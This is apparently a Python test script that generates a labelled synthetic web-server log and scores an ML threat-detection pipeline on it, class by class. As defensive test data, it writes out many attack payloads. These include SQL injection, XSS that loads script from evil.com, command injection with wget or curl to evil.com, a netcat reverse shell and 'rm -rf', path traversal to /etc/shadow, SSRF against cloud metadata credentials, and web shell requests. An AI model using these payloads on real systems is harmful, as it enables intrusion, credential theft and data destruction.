"""
test_all_attack_classes.py
===========================
Generates a comprehensive multi-vector log stream (225 requests) across ALL 11 classes:
1. Benign (80)
2. SQL Injection (20)
3. Cross-Site Scripting (20)
4. Command Injection (15)
5. Path Traversal (15)
6. Brute Force (15)
7. DDoS HTTP Flood (15)
8. Directory Fuzzing (15)
9. Malicious Scanner (10)
10. SSRF (10)
11. Web Shell (10)

Runs the complete Practical 10 Forensic Pipeline and outputs a class-by-class audit table.
"""

import sys
from pathlib import Path
from datetime import datetime, timedelta
import random
import urllib.parse
import pandas as pd
import numpy as np

PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent
sys.path.insert(0, str(PROJECT_ROOT / "Practical 10"))

from pipeline.log_parser import parse_logs_text
from pipeline.preprocessor import clean_and_normalize_logs
from pipeline.feature_extractor import extract_features_dataframe
from pipeline.inference_engine import ThreatInferenceEngine

base_time = datetime(2026, 10, 9, 8, 0, 0)
test_records = []  # list of (raw_log_line, true_class)

# 1. Benign (80 requests)
benign_samples = [
    ("GET", "/", 200, 4520, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"),
    ("GET", "/assets/css/main.css", 200, 12840, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"),
    ("GET", "/assets/js/bundle.min.js", 200, 48210, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"),
    ("GET", "/assets/images/hero.webp", 200, 34200, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"),
    ("GET", "/favicon.ico", 200, 1150, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"),
    ("GET", "/about-us", 200, 5120, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"),
    ("GET", "/contact", 200, 3940, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"),
    ("POST", "/contact/submit", 200, 450, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"),
    ("GET", "/faq", 200, 5800, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"),
    ("GET", "/privacy-policy", 200, 6210, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"),
    ("GET", "/search?q=wireless+headphones", 200, 6820, "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1"),
    ("GET", "/products?category=electronics&page=1", 200, 7910, "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1"),
    ("GET", "/products/view?id=4920", 200, 8200, "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1"),
    ("POST", "/cart/add", 200, 120, "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1"),
    ("GET", "/cart/checkout", 200, 9400, "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1"),
    ("GET", "/dashboard", 200, 8920, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"),
    ("GET", "/dashboard/analytics", 200, 14200, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"),
    ("GET", "/api/v1/metrics?range=24h", 200, 4890, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"),
    ("POST", "/api/v1/export/csv", 200, 24800, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"),
    ("GET", "/healthz", 200, 24, "kube-probe/1.28")
]
benign_ips = ["192.168.1.10", "192.168.1.20", "10.0.0.15", "172.16.0.5", "83.149.9.216"]
for i in range(80):
    m, res, status, b_val, ua = benign_samples[i % len(benign_samples)]
    ip = benign_ips[i % len(benign_ips)]
    ts = (base_time + timedelta(seconds=i * 6)).strftime("%d/%b/%Y:%H:%M:%S +0000")
    line = f'{ip} - - [{ts}] "{m} {res} HTTP/1.1" {status} {b_val} "https://example.com/" "{ua}"'
    test_records.append((line, "benign"))

# 2. SQL Injection (20 requests)
sqli_payloads = [
    "/products?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users--",
    "/item.php?id=-1%27%20OR%201=1--%20",
    "/api/v1/user?id=1%20AND%201=1%20UNION%20ALL%20SELECT%20NULL,version()--",
    "/search?id=1%27;WAITFOR%20DELAY%20%270:0:5%27--",
    "/products/search?q=1%22%20or%20%28select%20sleep(5)%29--",
    "/items?cat=admin%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--",
    "/login.php?user=admin%27%20OR%20%271%27=%271",
    "/catalog?id=105%20AND%20ASCII(SUBSTRING((SELECT%20password%20FROM%20users),1,1))>64--",
    "/article.php?id=99%20AND%20extractvalue(1,concat(0x7e,(select%20database()),0x7e))--",
    "/users?filter=1%27%20HAVING%201=1--",
    "/search?kw=%27%20UNION%20ALL%20SELECT%20NULL,NULL,schema_name%20FROM%20information_schema.schemata--",
    "/rest/v1/orders?cust_id=5%20OR%201=1%20ORDER%20BY%2010--",
    "/view?doc_id=%27%20OR%20EXISTS(SELECT%20*%20FROM%20admin)--",
    "/account?user=test%27%20EXEC%20xp_cmdshell(%27dir%27)--",
    "/lookup?ip=%27%20UNION%20SELECT%201,load_file(%27/etc/passwd%27)--",
    "/cart?item_id=12%20AND%201=(SELECT%20COUNT(*)%20FROM%20users)--",
    "/report?year=2024%20GROUP%20BY%20id%20UNION%20SELECT%201,2,3,4--",
    "/news?id=1;%20DROP%20TABLE%20logs--",
    "/query?name=admin%27%20AND%20SLEEP(3)%20AND%20%271%27=%271",
    "/data?id=1%20OR%20version()%20LIKE%20%27%8%27--"
]
for i, pay in enumerate(sqli_payloads):
    ts = (base_time + timedelta(seconds=500 + i * 10)).strftime("%d/%b/%Y:%H:%M:%S +0000")
    line = f'198.51.100.{10+i} - - [{ts}] "GET {pay} HTTP/1.1" 403 280 "-" "curl/7.88.1"'
    test_records.append((line, "sqli"))

# 3. Cross-Site Scripting (XSS) (20 requests)
xss_payloads = [
    "/comments?msg=%3Cscript%3Ealert(%27XSS_PWNED%27)%3C%2Fscript%3E",
    "/search?query=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E",
    "/profile?bio=%3Csvg/onload=alert(1)%3E",
    "/comment?body=%3Cbody%20onafterprint=alert(1)%3E",
    "/feed?post=%3Ciframe%20src=javascript:alert(1)%3E",
    "/review?text=%3Cscript%20src=http://evil.com/xss.js%3E%3C/script%3E",
    "/message?content=%3Ca%20href=javascript:alert(document.domain)%3Eclick%3C/a%3E",
    "/guestbook?entry=%3Cdetails/open/ontoggle=alert(1)%3E",
    "/post?content=%3Cinput%20onfocus=alert(1)%20autofocus%3E",
    "/contact?name=%3Cmarquee%20onstart=alert(1)%3E",
    "/forum?topic=%3Cvideo%3E%3Csource%20onerror=javascript:alert(1)%3E",
    "/help?q=%22%3E%3Cscript%3Edocument.location=%27http://evil.com%27%3C/script%3E",
    "/status?text=%3Cmath%3E%3Cmtext%3E%3Cscript%3Ealert(1)%3C/script%3E",
    "/user?display=%3Cdiv%20style=%22background:url(javascript:alert(1))%22%3E",
    "/note?txt=%3Ctable%20background=%22javascript:alert(1)%22%3E",
    "/blog?p=%3Cobject%20data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==%3E",
    "/forum/thread?title=%3Cembed%20src=javascript:alert(1)%3E",
    "/chat?msg=%3Ckeygen%20onfocus=javascript:alert(1)%20autofocus%3E",
    "/edit?val=%3Cselect%20onfocus=alert(1)%20autofocus%3E",
    "/share?link=javascript:confirm(%27hacked%27)"
]
for i, pay in enumerate(xss_payloads):
    ts = (base_time + timedelta(seconds=700 + i * 10)).strftime("%d/%b/%Y:%H:%M:%S +0000")
    line = f'203.0.113.{20+i} - - [{ts}] "GET {pay} HTTP/1.1" 400 310 "-" "Mozilla/5.0"'
    test_records.append((line, "xss"))

# 4. Command Injection (15 requests)
cmd_payloads = [
    "/ping.php?host=127.0.0.1;%20cat%20/etc/shadow",
    "/cgi-bin/test?cmd=127.0.0.1|whoami",
    "/tools/diag.php?ip=127.0.0.1&&id;ls%20-la",
    "/backup.sh?target=127.0.0.1;$(id)",
    "/api/system?exec=127.0.0.1%20|%20uname%20-a",
    "/network/test?addr=127.0.0.1;%20wget%20http://evil.com/shell.sh",
    "/admin/exec?c=127.0.0.1%20&&%20curl%20http://evil.com/mal",
    "/status/check?host=localhost;%20nc%20-e%20/bin/sh%2010.0.0.1%204444",
    "/tools/dns?domain=test.com;%20pwd",
    "/api/proc?run=127.0.0.1%20|%20bash%20-i",
    "/diag/traceroute?ip=127.0.0.1;%20rm%20-rf%20/tmp/*",
    "/util/ping?dest=127.0.0.1`whoami`",
    "/health/probe?arg=127.0.0.1;%20powershell%20-c%20whoami",
    "/sys/inspect?path=/;%20ls%20/var/www/html",
    "/monitor?target=127.0.0.1;%20cat%20/proc/cpuinfo"
]
for i, pay in enumerate(cmd_payloads):
    ts = (base_time + timedelta(seconds=900 + i * 12)).strftime("%d/%b/%Y:%H:%M:%S +0000")
    line = f'185.220.101.{10+i} - - [{ts}] "POST {pay} HTTP/1.1" 500 480 "-" "Python-urllib/3.10"'
    test_records.append((line, "command_injection"))

# 5. Path Traversal (15 requests)
trv_payloads = [
    "/download?file=../../../../../../etc/passwd",
    "/view.php?path=..%2f..%2f..%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts",
    "/include.php?doc=/var/log/apache2/access.log%00",
    "/get_doc?file=....//....//....//etc/shadow",
    "/export?template=../../../../../../proc/self/environ",
    "/read?filename=..\\..\\..\\..\\windows\\win.ini",
    "/static?file=../../../../../../etc/hosts",
    "/load?page=..%252f..%252f..%252fetc%252fpasswd",
    "/doc/view?p=../../../../../../boot.ini",
    "/content?f=../../../../../../etc/issue",
    "/archive/get?archive=../../../../../../etc/group",
    "/images/get?img=..%2f..%2f..%2f..%2fetc%2fresolv.conf",
    "/report?file=../../../../../../var/log/messages",
    "/attachment?name=..\\..\\..\\..\\..\\windows\\system.ini",
    "/retrieve?id=../../../../../../etc/security/limits.conf"
]
for i, pay in enumerate(trv_payloads):
    ts = (base_time + timedelta(seconds=1100 + i * 12)).strftime("%d/%b/%Y:%H:%M:%S +0000")
    line = f'192.0.2.{50+i} - - [{ts}] "GET {pay} HTTP/1.1" 403 210 "-" "curl/7.88.1"'
    test_records.append((line, "path_traversal"))

# 6. Credential Brute Force (15 requests - rapid 401s on login)
for i in range(15):
    ts = (base_time + timedelta(seconds=1300 + i)).strftime("%d/%b/%Y:%H:%M:%S +0000")
    line = f'45.33.32.156 - - [{ts}] "POST /login HTTP/1.1" 401 512 "https://example.com/login" "Hydra/9.5"'
    test_records.append((line, "brute_force"))

# 7. DDoS HTTP Flood (15 requests - burst from single IP)
for i in range(15):
    ts = (base_time + timedelta(seconds=1400 + i)).strftime("%d/%b/%Y:%H:%M:%S +0000")
    line = f'178.62.204.99 - - [{ts}] "GET /api/v1/stream HTTP/1.1" 200 1024 "-" "Slowloris/0.1"'
    test_records.append((line, "ddos_http_flood"))

# 8. Directory Fuzzing / Enumeration (15 requests)
fuzz_files = [
    "/.env", "/.git/HEAD", "/wp-config.php.bak", "/admin/backup.sql", "/phpmyadmin/index.php",
    "/web.config", "/.svn/entries", "/.DS_Store", "/config/database.yml", "/backup.tar.gz",
    "/server-status", "/swagger-ui.html", "/actuator/health", "/console/", "/dump.rdb"
]
for i, f_name in enumerate(fuzz_files):
    ts = (base_time + timedelta(seconds=1500 + i * 5)).strftime("%d/%b/%Y:%H:%M:%S +0000")
    line = f'94.102.49.190 - - [{ts}] "GET {f_name} HTTP/1.1" 404 180 "-" "DirBuster-1.0-RC1"'
    test_records.append((line, "dir_fuzzing"))

# 9. Malicious Vulnerability Scanner (10 requests)
scanner_probes = [
    "/nikto_test_file.html", "/scripts/setup.php", "/cgi-bin/status", "/administrator/help",
    "/test.cgi", "/modules/debug", "/xmlrpc.php", "/fckeditor/editor", "/ckeditor/samples", "/manager/html"
]
for i, prb in enumerate(scanner_probes):
    ts = (base_time + timedelta(seconds=1600 + i * 8)).strftime("%d/%b/%Y:%H:%M:%S +0000")
    line = f'103.251.167.20 - - [{ts}] "GET {prb} HTTP/1.1" 404 220 "-" "Nikto/2.1.6"'
    test_records.append((line, "mal_scanner"))

# 10. SSRF (10 requests)
ssrf_queries = [
    "/fetch?url=http://169.254.169.254/latest/meta-data/",
    "/proxy?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "/webhook?url=http://127.0.0.1:8080/admin/debug",
    "/curl?dest=http://10.0.0.1/internal/secrets.json",
    "/preview?link=http://192.168.1.1/router-config",
    "/api/ingest?feed=http://localhost:9200/_cat/indices",
    "/import?src=http://127.0.0.1:2375/version",
    "/export?callback=http://169.254.169.254/latest/user-data",
    "/service/call?endpoint=http://127.0.0.1:8500/v1/catalog/services",
    "/report?push=http://0.0.0.0:8000/env"
]
for i, sq in enumerate(ssrf_queries):
    ts = (base_time + timedelta(seconds=1700 + i * 10)).strftime("%d/%b/%Y:%H:%M:%S +0000")
    line = f'194.135.25.10 - - [{ts}] "POST {sq} HTTP/1.1" 403 310 "-" "Mozilla/5.0"'
    test_records.append((line, "ssrf"))

# 11. Web Shell Execution (10 requests)
webshell_queries = [
    "/shell.php?c=system(%27id%27)",
    "/cmd.php?cmd=whoami",
    "/c99.php",
    "/r57.php",
    "/b374k.php",
    "/wso.php",
    "/uploads/avatar.php?eval=phpinfo()",
    "/files/backdoor.jsp?action=exec",
    "/assets/shell.aspx?cmd=dir",
    "/api/shell?exec=passthru(%27cat%20/etc/passwd%27)"
]
for i, wsq in enumerate(webshell_queries):
    ts = (base_time + timedelta(seconds=1800 + i * 10)).strftime("%d/%b/%Y:%H:%M:%S +0000")
    line = f'212.102.57.12 - - [{ts}] "GET {wsq} HTTP/1.1" 403 240 "-" "curl/8.1.2"'
    test_records.append((line, "web_shell"))

# Save log file
log_lines = [r[0] for r in test_records]
log_path = PROJECT_ROOT / "comprehensive_multi_attack_eval.log"
with open(log_path, "w", encoding="utf-8") as f:
    f.write("\n".join(log_lines) + "\n")

# Copy to Practical 10 data as well
with open(PROJECT_ROOT / "Practical 10" / "data" / "comprehensive_multi_attack_eval.log", "w", encoding="utf-8") as f:
    f.write("\n".join(log_lines) + "\n")

print(f"[OK] Generated comprehensive_multi_attack_eval.log with {len(test_records)} requests across 11 classes!")

# Execute Pipeline
df_parsed = parse_logs_text("\n".join(log_lines))
df_clean = clean_and_normalize_logs(df_parsed)
df_feats = extract_features_dataframe(df_clean)

eng = ThreatInferenceEngine("Random Forest Ensemble (Champion)")
preds = eng.predict(df_feats, df_clean=df_clean)

df_eval = pd.concat([df_clean, preds], axis=1)
df_eval["true_class"] = [r[1] for r in test_records]
df_eval["is_actual_attack"] = df_eval["true_class"] != "benign"

# Overall metrics
overall_attacks_correct = ((df_eval["is_actual_attack"] == True) & (df_eval["is_attack"] == True)).sum()
overall_attacks_total = (df_eval["is_actual_attack"] == True).sum()
overall_benign_correct = ((df_eval["is_actual_attack"] == False) & (df_eval["is_attack"] == False)).sum()
overall_benign_total = (df_eval["is_actual_attack"] == False).sum()

print("\n" + "=" * 80)
print("       CLASS-BY-CLASS COMPREHENSIVE CYBERSECURITY THREAT AUDIT")
print("=" * 80)
print(f"Total Requests Analyzed: {len(df_eval):,}")
print(f"Overall Attack Detection (Recall) : {overall_attacks_correct} / {overall_attacks_total} ({overall_attacks_correct/overall_attacks_total*100:.2f}%)")
print(f"Overall Benign Passed (Specificity): {overall_benign_correct} / {overall_benign_total} ({overall_benign_correct/overall_benign_total*100:.2f}%)")
print(f"Total False Alarms               : {overall_benign_total - overall_benign_correct} / {overall_benign_total} ({(overall_benign_total - overall_benign_correct)/overall_benign_total*100:.2f}%)")
print(f"Overall Binary Accuracy          : {(overall_attacks_correct + overall_benign_correct) / len(df_eval)*100:.2f}%\n")

# Breakdown by Class
class_stats = []
for c_name in sorted(list(set(df_eval["true_class"]))):
    sub = df_eval[df_eval["true_class"] == c_name]
    tot = len(sub)
    if c_name == "benign":
        passed = (~sub["is_attack"]).sum()
        rate = passed / tot * 100
        status = "PASSED" if rate >= 95 else "ALERT"
        top_pred = sub["display_name"].mode()[0]
        avg_conf = sub["confidence_pct"].mean()
        class_stats.append({
            "Class Name": "Normal Traffic (Benign)",
            "Total Requests": tot,
            "Correct Actions": passed,
            "Accuracy / Block Rate (%)": f"{rate:.1f}%",
            "Avg Confidence": f"{avg_conf:.1f}%",
            "Primary Verdict": top_pred,
            "Security Status": status
        })
    else:
        blocked = sub["is_attack"].sum()
        rate = blocked / tot * 100
        status = "EXCELLENT" if rate >= 90 else ("GOOD" if rate >= 75 else "NEEDS TUNING")
        top_pred = sub["display_name"].mode()[0]
        avg_conf = sub["confidence_pct"].mean()
        class_stats.append({
            "Class Name": c_name.upper(),
            "Total Requests": tot,
            "Correct Actions": blocked,
            "Accuracy / Block Rate (%)": f"{rate:.1f}%",
            "Avg Confidence": f"{avg_conf:.1f}%",
            "Primary Verdict": top_pred,
            "Security Status": status
        })

df_report = pd.DataFrame(class_stats)
print(df_report.to_string(index=False))
